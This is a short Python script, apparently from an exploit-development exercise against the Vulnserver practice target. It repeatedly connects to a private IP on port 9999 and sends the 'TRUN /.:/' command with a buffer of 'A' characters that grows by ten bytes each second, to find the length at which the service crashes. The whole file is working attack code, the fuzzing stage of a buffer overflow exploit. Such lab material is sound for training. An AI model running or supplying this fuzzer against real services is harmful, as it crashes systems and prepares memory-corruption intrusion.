import time,sys
import socket

ser = "192.168.225.105"
port = 9999

buffer="A"* 100
req = "TRUN /.:/"

while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ser, port))
	print("Sending buffer size of: "+ str(len(buffer)))
	s.send(req + buffer)
	print(s.recv(1024))
	s.close()
	buffer = buffer + "A"*10
	time.sleep(1)
